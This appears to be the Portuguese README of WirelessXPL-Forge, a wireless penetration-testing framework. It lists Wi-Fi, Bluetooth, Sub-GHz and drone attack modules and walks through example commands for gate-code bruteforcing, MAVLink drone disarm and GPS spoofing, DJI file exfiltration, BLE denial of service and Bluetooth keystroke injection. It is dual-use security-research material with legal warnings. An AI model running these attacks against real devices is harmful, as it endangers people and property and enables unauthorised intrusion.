# WirelessXPL-Forge

> **Framework modular de pesquisa em segurança wireless** para 802.11 (WPA2/WPA3/WPE/EAPOL), Bluetooth Classic, BLE, Zigbee, RFID, Sub-GHz e segurança de drones - projetado para testes de invasão autorizados, pesquisa e educação.

**Versão:** 2.0.2 | **Licença:** BSD-3-Clause | **Python:** 3.8 - 3.13

**Idioma:** **English (en-US):** [README.md](README.md) · **Português (pt-BR)** - padrão desta página

[![Python 3.8–3.13](https://img.shields.io/badge/Python-3.8--3.13-blue.svg)](https://www.python.org/downloads/)
[![CI](https://github.com/mrhenrike/WirelessXPL-Forge/actions/workflows/compat-matrix.yml/badge.svg)](https://github.com/mrhenrike/WirelessXPL-Forge/actions/workflows/compat-matrix.yml)
[![Release](https://github.com/mrhenrike/WirelessXPL-Forge/actions/workflows/publish-pypi.yml/badge.svg)](https://github.com/mrhenrike/WirelessXPL-Forge/actions/workflows/publish-pypi.yml)
[![PyPI](https://img.shields.io/pypi/v/wirelessxpl.svg)](https://pypi.org/project/wirelessxpl/)
[![Licença](https://img.shields.io/badge/Licença-BSD%203--Clause-blue.svg)](LICENSE)

---

## Sobre o Projeto

O **WirelessXPL-Forge (WXF)** é um shell interativo e framework de módulos para pesquisa em segurança wireless. Ele oferece:

- Uma **CLI estilo Metasploit** (`use`, `set`, `run`, `search device=wifi`) para workflows de ataque e análise wireless
- Módulos Python nativos para **FragAttacks**, **KRACK**, **WPA3/Dragonblood**, **ataques BLE pairing**, **Braktooth**, **BlueBorne**, **AWDL**, **Zigbee/KillerBee**, e muito mais
- **Módulos bridge** para ferramentas externas: `aircrack-ng`, `hcxdumptool`, `mdk4`, `wifiphisher`, `eaphammer`, `airgeddon`, `bettercap`, `btlejack`, `opendrop`
- **Orquestração serial** para **firmware Bruce** (ESP32 Marauder) com perfis de fluxo semiautônomos
- **Catálogos upstream** rastreando a incorporação de issues/PRs da comunidade em 15+ repositórios de pesquisa de segurança
- **Pipelines de análise PCAP**: EAPOL 4-way, PMKID, TKIP, Dragonblood, WPE, BLE, workspace SQL para PCAPs
- **Suite Sub-GHz completa**: ataques a protocolos 300-928 MHz (EV1527, KeeLoq, CAME, NICE, TPMS)
- **Segurança de drones/UAV**: MAVLink, DJI, Parrot, FPV e BLE Remote ID
- **Evidence Vault forense**: cadeia de custódia tamper-evident compatível com ISO/IEC 27037
- **Wardriving com GPS**: logging georeferenciado, exportação KML, classificação de risco
- **WIDS**: sistema leve de detecção de intrusão wireless com alertas em tempo real

**Projetos irmãos:** [RouterXPL-Forge](https://github.com/mrhenrike/RouterXPL-Forge) (roteadores/switches) · [FirewallXPL-Forge](https://github.com/mrhenrike/FirewallXPL-Forge) (NGFW/UTM, privado)

**Linhagem:** [threat9/routersploit](https://github.com/threat9/routersploit) → RouterXPL-Forge → fork wireless

**Mantenedor:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://github.com/Uniao-Geek)

---

## Pré-requisitos do sistema (fora do wheel PyPI)

O `pip install wirelessxpl` traz **apenas** o pacote Python e dependências declaradas. A tabela abaixo são **ferramentas no host** (apt, brew, instaladores) - **não** vão dentro do `.whl`. Os **módulos bridge** continuam **integrados** ao WXF (`use` → `run`); são **orquestração via subprocess**, não "ferramenta solta". Não incorporamos projetos inteiros (ex.: wifiphisher GPL) neste repositório - ver **[docs/INTEGRATION_MODEL.md](docs/INTEGRATION_MODEL.md)**.

| Ferramenta | Função |
|------------|--------|
| **aircrack-ng suite** | `aircrack-ng`, `airodump-ng`, `aireplay-ng` - PCAP / wifi_lab |
| **hcxtools / hcxdumptool** | PMKID e conversão de hash para hashcat |
| **hashcat** | Cracking offline WPA2/WPA3 (modos 22000/22001) |
| **tshark** *(opcional)* | Dissecção BLE / 802.11 |
| **mdk4 / mdk3** *(opcional)* | Deauth, beacon floods, mesh flooding |
| **hostapd + dnsmasq** *(opcional)* | Rogue AP / evil-twin + DHCP/DNS |
| **wifiphisher** *(opcional)* | Phishing via **bridge** |
| **eaphammer** *(opcional)* | EAP/PEAP via **bridge** |
| **airgeddon** *(opcional)* | Ataques via **bridge** |
| **btlejack** *(opcional)* | BLE via **bridge** |
| **opendrop / owl** *(opcional)* | AWDL/AirDrop via **bridge** |
| **HackRF One / CC1101+ESP32** *(opcional)* | Transmissão Sub-GHz (TX+RX) para módulos subghz |
| **RTL-SDR** *(opcional)* | Recepção passiva Sub-GHz (somente RX) |
| **Firmware Bruce ESP32** *(opcional)* | [BruceDevices/firmware](https://github.com/BruceDevices/firmware) - imagem de dispositivo |
| **pyserial** *(opcional)* | Serial Bruce (`pip install wirelessxpl[serial]`) |
| **gpsd** *(opcional)* | GPS para módulos wardrive com georreferenciamento |

Execute `use generic/external/wireless_tool_prereq_audit` após instalar para validar o PATH.

---

## Instalação Rápida

### Via PyPI

```bash
pip install wirelessxpl
# com suporte serial para Bruce/ESP32:
pip install "wirelessxpl[serial]"
# com classificação ML de sinal:
pip install "wirelessxpl[ml-lite]"
# com suporte GPS para wardrive:
pip install "wirelessxpl[gps]"
```

### Via código fonte

```bash
git clone https://github.com/mrhenrike/WirelessXPL-Forge.git
cd WirelessXPL-Forge
pip install -r requirements.txt
python wxf.py
# ou
python -m wirelessxpl
# ou (após pip install -e .)
wxf
```

### WSL2 / Kali (recomendado para ferramentas de captura)

```bash
sudo apt install aircrack-ng hcxtools hcxdumptool mdk4 hostapd dnsmasq tshark gpsd
pip install wirelessxpl
```

---

## Uso Rápido

```
$ python wxf.py
wxf > help
wxf > show modules
wxf > search device=wifi
wxf > search device=bluetooth
wxf > search device=subghz
wxf > use generic/wifi_lab/handshake_snooper
wxf (HandshakeSnooper) > show options
wxf (HandshakeSnooper) > set interface wlan0mon
wxf (HandshakeSnooper) > set target_bssid AA:BB:CC:DD:EE:FF
wxf (HandshakeSnooper) > run
```

### Modo não-interativo (scripts)

```bash
python wxf.py -m generic/wifi_lab/handshake_snooper \
  interface=wlan0mon target_bssid=AA:BB:CC:DD:EE:FF
```

---

## Referência de Módulos

### Wi-Fi / 802.11 (generic/wifi_lab)

| Módulo | Descrição |
|--------|-----------|
| `fragattacks` | FragAttacks (CVE-2020-26140+) - injeção de frames + detecção 802.11ax |
| `handshake_snooper` | Pipeline PMKID-first + captura de handshake por deauth |
| `wpa3_attack_suite` | Dragonblood SAE flood, CSA+harvest, Double SSID, downgrade |
| `auth_flood` | Auth/EAPOL flood, amok mode, mesh flood (backend mdk4) |
| `evil_twin_workflow` | Evil-twin completo com verificação pós-captura (aircrack-ng) |
| `captive_portal_modern_lab` | Portal cativo moderno com coletor de credenciais HTML/JS |
| `mitm_wifi_bridge` | ARP/DNS spoofing + Ghost combo (bettercap) |
| `adaptive_harvest` | Harvesting adaptativo de canais/PMKID guiado por score |
| `wardriving_deauth_loop` | Ciclos automatizados de scan/deauth/captura (wardriving) |
| `wireless_ids` | IDS leve: baseline de BSSID + detecção de rogue AP |
| `awdl_attack` | AWDL/AirDrop (opendrop + owl) - discover, send, DoS |
| `momo_integrated_attack` | Orquestração KARMA + PMKID-first + downgrade |

### Bluetooth / BLE (generic/bluetooth)

| Módulo | Descrição |
|--------|-----------|
| `bt_hid_injection` | Injeção de teclado HID Bluetooth (fallback Broadcom) |
| `bt_hid_keyboard_inject` | Injeção HID via L2CAP - CVE-2023-45866 (iOS/Android/Linux) |
| `bt_baseband_attack` | BrakTooth / SweynTooth via serial ESP32 |
| `bt_session_attack` | Ataques de sessão KNOB, BIAS, BLUFFS |
| `blueborne_attack` | BlueBorne L2CAP overflow (perfis de offset de kernel) |
| `ble_btlejack` | BTLEJack BLE sniff/jam/hijack |

### Sub-GHz / ISM (generic/subghz)

| Módulo | Descrição |
|--------|-----------|
| `static_code_replay` | Replay de código fixo: EV1527, Princeton/PT2262 (315/433 MHz) |
| `debruijn_bruteforce` | Sequência DeBruijn para CAME 12-bit, NICE Flo, Holtek HT12X |
| `keeloq_decoder` | Decodificador KeeLoq 64-bit: extrai FIX, HOP e fabricante |
| `keeloq_replay` | Replay de código KeeLoq capturado |
| `tpms_decoder` | Decodificador TPMS (315/433 MHz): ID, pressão, temperatura |
| `tpms_spoof` | Spoofing de sensor TPMS (simula pneu com pressão crítica) |
| `ev1527_vehicle_cve_2025_70994` | CVE-2025-70994 - E-bikes Yadea EV1527 sem autenticação |
| `subghz_jammer` | Jammer RF (PREREQ: HackRF + gaiola de Faraday + simulate=false) |

### Drones / UAV (generic/drones)

| Módulo | Descrição |
|--------|-----------|
| `mavlink_force_disarm` | Desarme forçado via MAVLink UDP (ArduPilot/PX4) |
| `mavlink_gps_spoof` | Injeção de coordenadas GPS falsas via MAVLink |
| `mavlink_mission_override` | Substituição de missão de voo ativa |
| `dji_quicktransfer_exfil_cve_2023_6951` | Exfiltração DCIM sem autenticação via QuickTransfer |
| `hsrid01_ble_dos_cve_2024_52876` | BLE DoS no Remote ID do Holy Stone HSRID01 |

### Vigilância, Forense e Wardriving (generic/)

| Módulo | Caminho | Descrição |
|--------|---------|-----------|
| `wifi_evidence_vault` | `generic/evidence_vault/` | Cadeia de custódia forense ISO/IEC 27037 |
| `wardrive_logger` | `generic/wardrive/` | Wardriving com GPS, exportação KML, classificação de risco |
| `wifi_ids` | `generic/wids/` | WIDS: detecção de deauth flood, beacon flood, evil twin |

### Bridge ESP32 / Bruce (generic/external)

| Módulo | Descrição |
|--------|-----------|
| `bruce_serial_bridge` | Engine de fluxo serial para firmware Bruce ESP32 (15+ perfis) |
| `bruce_upstream_tracker` | Visualizador de catálogo de issues/PRs do firmware Bruce |
| `airgeddon_bridge` | Bridge multi-modo para Airgeddon |
| `wifiphisher_bridge` | Bridge Wifiphisher com sniffer embutido |
| `eaphammer_bridge` | Bridge EAPHammer (PEAP Win11 + coerção HTTP) |

---

## Integração Bruce / ESP32 Marauder

O WXF inclui um engine completo de fluxo serial para o [BruceDevices/firmware](https://github.com/BruceDevices/firmware):

```
wxf > use generic/external/bruce_serial_bridge
wxf (BruceSerialBridge) > set serial_port /dev/ttyACM0
wxf (BruceSerialBridge) > set flow_profile capture_handshake_flow
wxf (BruceSerialBridge) > run

# Perfis de fluxo disponíveis:
#   baseline_status_flow            capture_handshake_flow
#   wifi_menu_navigation_flow       deauth_clone_verify_flow
#   sniffer_capture_flow            evil_portal_karma_flow
#   wifi_attack_lab_flow            raw_sniffer_probe_flow
#   wifi_bruteforce_recon_flow      navigation_recovery_flow
#   captive_portal_endpoint_config_flow
#   repeater_wisp_setup_flow        external_adapter_probe_flow
#   webui_password_flow             target_attack_stability_flow
#   ble_recon_spam_flow             ble_badble_recovery_flow
#   rf_spectrum_scan_flow           rf_jammer_stability_flow
```

---

## Documentação e Wiki

- **[docs/wiki/en-US/](docs/wiki/en-US/)** - Inglês (padrão)
- **[docs/wiki/pt-BR/](docs/wiki/pt-BR/)** - Português
- **[docs/FULL_CATALOG.md](docs/FULL_CATALOG.md)** - catálogo completo de módulos
- **[docs/COVERAGE_MATRIX.md](docs/COVERAGE_MATRIX.md)** - matriz de cobertura de dispositivos

---

## Novos Módulos v1.8.0 - Expansão IoT/OT Completa

### Suite Sub-GHz (300-928 MHz)

Ataques a controles remotos, portões de garagem, alarmes e sensores IoT
operando nas bandas 315/433/868/915 MHz.

**Protocolos suportados:**

| Protocolo | Bits | Frequências | Segurança | Módulo |
|---|---|---|---|---|
| EV1527 | 24 | 433 MHz | Nenhuma | `subghz/static_code_replay` |
| Princeton/PT2262 | 24 | 315/433 MHz | Nenhuma | `subghz/static_code_replay` |
| CAME | 12 | 303-868 MHz | Nenhuma | `subghz/debruijn_bruteforce` |
| NICE Flo | 12 | 433/868 MHz | Nenhuma | `subghz/debruijn_bruteforce` |
| Holtek HT12X | 12 | 315/433/868 MHz | Nenhuma | `subghz/debruijn_bruteforce` |
| KeeLoq | 64 | 433/868 MHz | Rolling code | `subghz/keeloq_*` |
| TPMS | var | 315/433 MHz | CRC apenas | `subghz/tpms/*` |
| EV1527 veicular | 24 | 433 MHz | Nenhuma | `subghz/ev1527_vehicle_cve_2025_70994` |

**PREREQUISITO DE HARDWARE:** HackRF One (TX+RX) OU CC1101+ESP32 OU RTL-SDR (RX passivo)

**Exemplos de uso:**

```bash
# Bruteforce portão CAME 12-bit (4.096 combinações ~5 min)
wxf > use generic/subghz/debruijn_bruteforce
wxf (DeBruijn) > set protocol CAME
wxf (DeBruijn) > set frequency 433.92
wxf (DeBruijn) > set output_sub /tmp/came_brute.sub
wxf (DeBruijn) > run

[*] Gerando sequência DeBruijn para CAME 12-bit @ 433.92 MHz
[*] Total de combinações: 4.096
[*] Tempo estimado @ 287ms/código: ~4,8 minutos
[+] Arquivo gerado: /tmp/came_brute.sub (compatível com Flipper Zero e Bruce firmware)
[*] Para usar no Flipper: Sub-GHz -> Saved -> came_brute.sub -> Send

# Decodificar sinal KeeLoq capturado
wxf > use generic/subghz/keeloq_decoder
wxf (KeeLoqDecoder) > set capture_file /tmp/gate_signal.sub
wxf (KeeLoqDecoder) > run

[*] Analisando arquivo: /tmp/gate_signal.sub
[+] Protocolo detectado: KeeLoq 64-bit
[+] FIX (fixo): 0xA1B2C3D4 (serial=0xA1B2, button=0x03)
[+] HOP (cifrado): 0xE5F60789
[+] Fabricante estimado: CAME Space
[!] Chave de criptografia necessária para decifrar HOP

# CVE-2025-70994 - Bicicleta elétrica Yadea EV1527
wxf > use generic/subghz/ev1527_vehicle_cve_2025_70994
wxf (EV1527Vehicle) > set target_id 0xABCDE  # ID capturado da vítima
wxf (EV1527Vehicle) > set command start
wxf (EV1527Vehicle) > set simulate true
wxf (EV1527Vehicle) > run

[SIMULATE] EV1527 frame para Start: 0xABCDE2 (24 bits)
[SIMULATE] Payload: preamble + 20-bit ID + 4-bit CMD
[!] Dispositivo: Yadea T5 E-Bike e similares (CVE-2025-70994, CVSS 7.3)
[!] Set simulate=false para transmitir (PREREQ: HackRF ou CC1101)
```

> **Aviso Legal:** Jamming de RF é ilegal no Brasil (Lei 9.472/97, Art. 183).
> O módulo `subghz_jammer` requer `simulate=false` + `destructive=true` + confirmação explícita.
> Use apenas em ambientes RF blindados (gaiola de Faraday).

---

### Segurança de Drones/UAV

Testes de segurança em sistemas de drones MAVLink, DJI, Parrot e FPV.

**Ataques MAVLink (ArduPilot/PX4):**

```bash
# AVISO: O MAVLink v1 não possui autenticação. Qualquer dispositivo
# na rede UDP pode enviar comandos ao drone.

# Forçar desarme (SIMULAR PRIMEIRO!)
wxf > use generic/drones/mavlink/mavlink_force_disarm
wxf (MAVForceDisarm) > set rhost 192.168.1.100
wxf (MAVForceDisarm) > set rport 14550
wxf (MAVForceDisarm) > set simulate true
wxf (MAVForceDisarm) > run

[SIMULATE] Enviaria MAV_CMD_COMPONENT_ARM_DISARM (param1=0, param2=21196)
[SIMULATE] Destino: udp://192.168.1.100:14550 sysid=1 compid=1
[!] PREREQUISITO: Acesso de rede UDP ao drone na porta 14550
[!] AVISO: Desarme forçado em drone em voo causa queda e danos

# Spoof de GPS via MAVLink
wxf > use generic/drones/mavlink/mavlink_gps_spoof
wxf (MAVGPSSpoof) > set rhost 192.168.1.100
wxf (MAVGPSSpoof) > set fake_lat -23.5505
wxf (MAVGPSSpoof) > set fake_lon -46.6333
wxf (MAVGPSSpoof) > set simulate true
wxf (MAVGPSSpoof) > run

[SIMULATE] Injetaria GPS_INPUT com coordenadas falsas
[SIMULATE] Lat: -23.5505 Lon: -46.6333 Alt: 500m Sats: 10 HDOP: 0.5
[!] Funciona apenas quando GPS_TYPE2=MAV está configurado no flight controller

# DJI CVE-2023-6951 - QuickTransfer exfiltração sem autenticação
wxf > use generic/drones/dji/dji_quicktransfer_exfil_cve_2023_6951
wxf (DJIQuickTransfer) > set rhost 192.168.2.1
wxf (DJIQuickTransfer) > set simulate true
wxf (DJIQuickTransfer) > run

[SIMULATE] Tentaria conexão sem autenticação ao QuickTransfer
[SIMULATE] Listaria: /DCIM/ com fotos e vídeos do drone
[!] Afeta: DJI Mavic 3, Matrice 300, Mini 3 Pro
[!] PREREQUISITO: Conectado ao WiFi QuickTransfer do drone

# CVE-2024-52876 - Holy Stone HSRID01 BLE DoS
wxf > use generic/drones/holystone/hsrid01_ble_dos_cve_2024_52876
wxf (HolyStoneDoS) > set target_mac AA:BB:CC:DD:EE:FF
wxf (HolyStoneDoS) > set simulate true
wxf (HolyStoneDoS) > run

[SIMULATE] Leria GATT attribute 0xFFFA repetidamente via BLE
[SIMULATE] Resultado: módulo Remote ID seria desligado remotamente
[!] CVE-2024-52876, CVSS 7.5 - Afeta firmware < 1.1.8
[!] PREREQUISITO: Adaptador Bluetooth BLE
```

> **Aviso Legal:** Interferência com aeronaves é crime federal (Lei 7.565/86 - Código Brasileiro de Aeronáutica).
> Todos os módulos de drone exigem `simulate=true` por padrão. Testes ao vivo apenas com aeronaves
> de sua propriedade, em espaço aéreo não controlado e com DECEA/ANAC consultados.

---

### Evidence Vault - Cadeia de Custódia Forense

Registro tamper-evident compatível com ISO/IEC 27037 para pentest WiFi.

```bash
# Iniciar sessão de coleta de evidências
wxf > use generic/evidence_vault/wifi_evidence_vault
wxf (EvidenceVault) > set session_id pentest_escritorio_2026
wxf (EvidenceVault) > set vault_dir /evidence/cliente_xpto
wxf (EvidenceVault) > set operator analista01

# Registrar rede descoberta
wxf (EvidenceVault) > log_scan --ssid "EscritorioWiFi" --bssid AA:BB:CC:DD:EE:FF --channel 6 --rssi -65 --security WPA2

[+] Evidência #0001 registrada: kind=scan
[+] SHA-256: a1b2c3d4...
[+] Chain head: a1b2c3d4...

# Registrar handshake capturado
wxf (EvidenceVault) > log_capture --ssid "EscritorioWiFi" --bssid AA:BB:CC:DD:EE:FF --type handshake --file /captures/escritorio.hc22000

[+] Evidência #0002 registrada: kind=capture
[+] Artifact hash: e5f6...
[+] Chain head: b2c3d4e5...

# Verificar integridade da cadeia
wxf (EvidenceVault) > verify

[+] Chain VÁLIDA (2 registros)
[+] Todas as hashes verificadas
[+] Compatível com ISO/IEC 27037 chain-of-custody
[+] Head hash: b2c3d4e5...

# Exportar bundle de evidências
wxf (EvidenceVault) > export_bundle --output /reports/evidencias_cliente.tar.gz

[+] Bundle criado: /reports/evidencias_cliente.tar.gz (4.2 MB)
[+] Contém: ledger JSONL + 1 artifact binário
```

---

### Wardriving com GPS

```bash
wxf > use generic/wardrive/wardrive_logger
wxf (Wardrive) > set db_path /tmp/wardrive_sessao.db

# Registrar rede (GPS automático via gpsd se disponível)
wxf (Wardrive) > log_network --ssid "HomeNet" --bssid "00:11:22:33:44:55" --channel 11 --rssi -72 --security WPA2

[*] GPS: disponível (lat=-23.5505, lon=-46.6333)
[+] Rede registrada: HomeNet @ ch11 -72dBm WPA2 [risco: low]

# Exportar para visualização
wxf (Wardrive) > export_kml --output /tmp/wardrive.kml

[+] KML gerado: /tmp/wardrive.kml (12 redes com GPS)
[*] Abra no Google Earth ou Google Maps

wxf (Wardrive) > summary

[*] Redes total: 47
[*] Com GPS: 42
[*] Risco crítico (Open/WEP): 3
[*] Risco alto (WPA): 8
[*] Risco médio (WPA2+WPS): 12
[*] Risco baixo (WPA2/WPA3): 24
```

---

### WIDS - Sistema de Detecção de Intrusão Wireless

```bash
wxf > use generic/wids/wifi_ids
wxf (WIDS) > set interface wlan0mon
wxf (WIDS) > set simulate true  # use false para captura real

# Adicionar APs legítimos conhecidos (para detecção de Evil Twin)
wxf (WIDS) > set known_aps '{"AA:BB:CC:DD:EE:FF": "EmpresaWiFi"}'
wxf (WIDS) > run

[*] WIDS iniciado em modo simulação
[!] ALERT [HIGH] DEAUTH_FLOOD
    Origem: DE:AD:BE:EF:00:01 | Contagem: 15/s
[!] ALERT [CRITICAL] EVIL_TWIN
    SSID: EmpresaWiFi
    AP legítimo: AA:BB:CC:DD:EE:FF
    AP rogue: DE:AD:00:11:22:33
    RSSI: -45 dBm

wxf (WIDS) > summary

[*] Total de alertas: 4
[*] Por tipo: deauth_flood=2, beacon_flood=1, evil_twin=1
[*] Por severidade: critical=1, high=2, medium=1
```

---

### Injeção de Teclado Bluetooth (HID)

```bash
wxf > use generic/bluetooth/bt_hid_keyboard_inject
wxf (BTHIDInject) > set target_mac AA:BB:CC:DD:EE:FF
wxf (BTHIDInject) > set payload "https://site-teste.local\n"
wxf (BTHIDInject) > set simulate true
wxf (BTHIDInject) > run

[SIMULATE] Injetaria 23 HID reports via Bluetooth L2CAP
[SIMULATE] Canais: 17 (controle) + 19 (interrupção)
[SIMULATE] Payload: 'https://site-teste.local' + Enter
[SIMULATE] Reports sample: a10100001a000000000000...
[!] CVE-2023-45866 - Afeta iOS, Android, Linux (BlueZ)
[!] PREREQUISITO: Adaptador USB Bluetooth + Linux com BlueZ + root
[!] Use APENAS em dispositivos de sua propriedade ou com autorização escrita
```

> **Disclaimer:** Todos os módulos de ataque são destinados exclusivamente a testes autorizados,
> pesquisa e educação. Uso não autorizado é crime federal.
> Configure sempre `simulate=true` antes de testes ao vivo.

---

## Contribuindo

Veja [CONTRIBUTING.pt-BR.md](CONTRIBUTING.pt-BR.md) e [CONTRIBUTORS.pt-BR.md](CONTRIBUTORS.pt-BR.md).  
Leia nosso [Código de Conduta](CODE_OF_CONDUCT.pt-BR.md) e a [Política de Segurança](SECURITY.pt-BR.md).

---

## Licença

BSD 3-Clause License - veja [LICENSE](LICENSE) para detalhes.

**O WirelessXPL-Forge é destinado exclusivamente para pesquisa de segurança e educação autorizadas.**  
O uso contra sistemas que você não possui ou não tem permissão escrita explícita para testar é ilegal.

---

**Autor:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://github.com/Uniao-Geek)  
**Suporte:** [suporte@uniaogeek.com.br](mailto:suporte@uniaogeek.com.br)  
**Linhagem:** [threat9/routersploit](https://github.com/threat9/routersploit) → RouterXPL-Forge → WirelessXPL-Forge
